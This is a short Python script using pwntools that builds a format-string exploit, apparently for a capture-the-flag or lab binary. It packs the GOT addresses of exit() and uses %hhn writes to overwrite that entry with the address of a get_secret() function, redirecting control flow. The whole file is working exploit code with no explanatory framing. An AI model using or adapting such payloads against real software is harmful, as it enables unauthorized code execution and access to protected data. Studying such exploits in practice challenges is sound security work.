import struct
from pwn import *

#safe stack addr w/o aslr on my kali box
#addr = 0xffffd24c

# got addr for exit()
addr_1 = 0x804a02c
addr_2 = 0x804a02d

# package addr
passwd = '' + struct.pack("I", addr_1) + struct.pack("I", addr_2)
print passwd

# overwire 2 least significant bytes with addr of get_secret()
# 0x8048713 => 0x8713

# 1st byte 0x13
write_1 = "%19x%11$hhn"
# 2nd byte 0x87
write_2 = "%372x%12$hhn"
print write_1 + write_2

# enter pass
print passwd

